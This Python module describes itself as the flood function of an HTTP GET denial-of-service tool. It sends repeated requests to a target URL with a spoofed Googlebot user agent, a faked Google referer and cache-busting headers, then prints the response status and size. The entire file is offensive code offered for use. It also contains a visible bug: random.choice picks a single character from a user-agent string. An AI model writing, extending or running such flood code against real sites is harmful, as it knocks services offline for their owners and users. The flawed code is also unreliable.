"""This module provides the flood function for an HTTP GET request DoS attack."""

import json
import random

import requests
from colorama import Fore as F
from requests.exceptions import Timeout

user_agents = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'


headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "referer": "https://www.google.com/",
    "Accept-Encoding": "gzip, deflate, br",
}

color_code = {True: F.GREEN, False: F.RED}


def flood(target: str) -> None:
    """Start an HTTP GET request flood.

    Args:
        - target - Target's URL

    Returns:
        None
    """
    global headers

    headers["User-agent"] = random.choice(user_agents)

    try:
        response = requests.get(target, headers=headers, timeout=4)
    except (Timeout, OSError):
        return
    else:
        status = (
            f"{color_code[response.status_code == 200]}Status: [{response.status_code}]"
        )
        payload_size = f"{F.RESET} Requested Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
        print(f"{status}{F.RESET} --> {payload_size} {F.RESET}")
